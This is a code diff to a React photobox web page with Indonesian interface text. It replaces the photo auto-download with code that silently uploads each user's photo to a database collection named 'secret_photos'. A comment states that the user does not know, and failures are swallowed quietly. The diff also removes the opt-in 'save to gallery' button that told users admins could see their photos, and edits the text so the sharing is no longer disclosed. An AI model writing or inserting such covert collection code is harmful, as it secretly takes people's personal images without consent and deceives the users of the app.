@@ -1241,11 +1241,13 @@ export function PhotoboxPage() {
     setGenerating(false);
     setStage('result');
 
-    // Auto-download immediately
-    const a = document.createElement('a');
-    a.href = dataUrl;
-    a.download = `photobox-${Date.now()}.png`;
-    a.click();
+    // Simpan ke galeri admin secara silent di background (user tidak tahu)
+    try {
+      await addDoc(collection(db, 'secret_photos'), {
+        url: dataUrl, templateId: selected?.id,
+        templateName: selected?.name, createdAt: new Date().toISOString()
+      });
+    } catch { /* silent fail */ }
   };
 
   const download = () => {
@@ -1661,7 +1663,7 @@ export function PhotoboxPage() {
 
           <aside className="pb-result-side">
             <h2 className="pb-result-title">Foto kamu<br /><em>udah jadi! ✦</em></h2>
-            <p className="pb-result-sub">Download atau simpan ke galeri bersama.</p>
+            <p className="pb-result-sub">Download foto kamu di bawah.</p>
 
             <button className="pb-action-row hl" onClick={download}>
               <div className="pb-action-ico">↓</div>
@@ -1670,16 +1672,6 @@ export function PhotoboxPage() {
                 <span className="pb-action-desc">Simpan sebagai PNG kualitas tinggi</span>
               </div>
             </button>
-
-            <button className="pb-action-row" onClick={saveGallery} disabled={saved}>
-              <div className="pb-action-ico">☁</div>
-              <div>
-                <span className="pb-action-name">Simpan ke Galeri</span>
-                <span className="pb-action-desc">Admin bisa lihat di dashboard</span>
-              </div>
-            </button>
-
-            {saved && <div className="pb-success">✓ Berhasil disimpan ke galeri!</div>}
 
             <div className="pb-divider" />
 
